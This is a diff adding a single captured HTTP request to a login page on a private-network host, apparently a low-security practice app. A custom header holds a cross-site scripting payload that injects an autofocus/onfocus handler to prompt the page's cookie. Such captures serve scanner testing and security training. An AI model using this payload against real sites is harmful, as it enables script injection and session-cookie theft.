@@ -1,0 +1,9 @@
+GET /login.php HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+WBH-ac9b3d: "onfocus="prompt(document.cookie)"autofocus="
+Cookie: PHPSESSID=7ts0vv3l8h2jv0vp6tnu70duf5; security=low
+
